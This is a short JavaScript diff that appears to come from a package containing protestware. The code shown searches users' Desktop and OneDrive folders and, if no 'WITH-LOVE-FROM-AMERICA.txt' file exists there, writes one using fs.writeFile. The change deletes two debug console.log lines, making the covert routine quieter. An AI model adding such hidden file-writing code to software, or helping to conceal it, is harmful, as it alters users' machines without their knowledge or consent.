@@ -14,7 +14,6 @@ const OneDriveFileExists=find(OneDrive,'WITH-LOVE-FROM-AMERICA.txt');
 
 
 function deliverAPeacefulMessage(path,message){
-    console.log(path);
     try{
         fs.writeFile(
             path, 
@@ -31,8 +30,6 @@ function deliverAPeacefulMessage(path,message){
 //let's be polite and only do this once.
 //hopefully once is all it takes.
 if(!DesktopFileExists?.length&&!OneDriveFileExists?.length&&!OneDriveDesktopFileExists?.length){
-    console.log('in here');
-
     const thinkaboutit='WITH-LOVE-FROM-AMERICA.txt';
 
     const WITH_LOVE_FROM_AMERICA=read(`./${thinkaboutit}`);
